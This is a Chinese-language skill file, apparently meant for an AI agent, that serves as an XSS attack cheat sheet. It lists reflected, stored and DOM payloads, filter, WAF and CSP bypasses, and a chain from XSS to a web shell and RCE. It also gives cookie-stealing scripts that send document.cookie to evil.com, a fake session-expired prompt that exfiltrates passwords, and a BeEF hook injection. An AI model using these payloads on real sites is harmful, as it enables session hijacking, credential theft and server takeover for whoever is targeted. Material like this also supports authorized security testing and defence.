---
name: xss-testing
description: XSS跨站脚本测试，覆盖检测→反射型→存储型→DOM型→Cookie窃取→BeEF→WAF绕过→CSP绕过→XSS→RCE利用链
---

# XSS跨站脚本测试

## 概述

XSS是最普遍的Web漏洞之一。本技能提供系统化的检测Payload、绕过技巧、利用链和自动化方法。

## 1. 快速检测

### 1.1 检测Payload

```html
<!-- 基础弹窗 (最常用) -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 短版 -->
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 无script标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 最短 -->
<svg/onload=alert(1)>
```

### 1.2 按输出点选择Payload

```
输入在 HTML标签之间  → <script>alert(1)</script>
输入在 <input> 属性中 → "><script>alert(1)</script>
输入在 <script> JS中  → '</script><script>alert(1)</script> 或 -alert(1)-
输入在 <a href> 中     → javascript:alert(1)
输入在 URL 参数中      → 闭合当前属性或标签
输入在 CSS 中          → expression/url/@import 等 CSS注入
输入在 JSON 响应中     → '</script>闭合 + HTML注入
```

## 2. 反射型XSS

### 2.1 常见注入点

```
搜索框:       ?q=<script>alert(1)</script>
错误消息:     ?error=<script>alert(1)</script>
重定向参数:   ?redirect=javascript:alert(1)
回调参数:     ?callback=<script>alert(1)</script>
```

### 2.2 绕过基础过滤

```html
<!-- 大小写混合 --> <ScRiPt>alert(1)</sCrIpT>
<!-- 双写绕过 -->   <scr<script>ipt>alert(1)</script>
<!-- 替换标签 -->   <img src=x onerror=alert(1)>
                   <svg onload=alert(1)>
                   <details open ontoggle=alert(1)>
<!-- 事件处理器 --> <marquee onstart=alert(1)>
                   <video><source onerror=alert(1)></video>
```

## 3. 存储型XSS

典型注入位置：留言板/评论区、用户资料页（用户名/签名/头像URL）、富文本编辑器（绕过DOMPurify等）、文件上传HTML/SVG。

## 4. DOM型XSS

```javascript
// 常见Source → Sink
document.write(location.hash)         // #<img src=x onerror=alert(1)>
element.innerHTML = location.search   // ?x=<img src=x onerror=alert(1)>
eval(location.hash.slice(1))          // #alert(1)

// jQuery
$('#div').html(location.hash)
$(location.hash)                      // jQuery selector injection

// AngularJS
{{constructor.constructor('alert(1)')()}}
```

## 5. Cookie/凭据窃取

```html
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
<!-- 无CORS --> <script>document.location='http://evil.com/steal?c='+document.cookie</script>
<!-- 伪造登录框 -->
<script>var p=prompt('Session expired, re-enter password:');new Image().src='http://evil.com/p?p='+p;</script>
```

## 6. WAF/编码绕过

```html
<!-- URL编码 --> %3Cscript%3Ealert(1)%3C%2Fscript%3E
<!-- Base64 -->  <script>eval(atob('YWxlcnQoMSk='))</script>
<!-- data: URI --> <object data="data:text/html,<script>alert(1)</script>">
<!-- Mutation XSS --> <noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## 7. CSP绕过

```bash
# 1. unsafe-inline → 直接<script>
# 2. unsafe-eval → eval()可用
# 3. 白名单CDN → JSONP劫持
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js?callback=alert(1)"></script>
# 4. data: → data:text/html,<script>alert(1)</script>
```

## 8. XSS → RCE 利用链

```
存储型XSS → 管理员Cookie → 登入后台
  → 文件上传 → WebShell → RCE
  → 模板编辑 → 写PHP代码 → RCE
  → 数据库管理 → SQL命令执行 → RCE
反射型XSS → 钓鱼链接 → 管理员触发 → 同存储型利用链
```

## 9. BeEF利用

```bash
# Hook注入: <script src="http://<beef-server>:3000/hook.js"></script>
# 利用模块: 浏览器指纹/内网扫描/社会工程弹窗/配合Metasploit
```

---

*参考: OWASP XSS Cheat Sheet + PortSwigger XSS + PayloadAllTheThings*
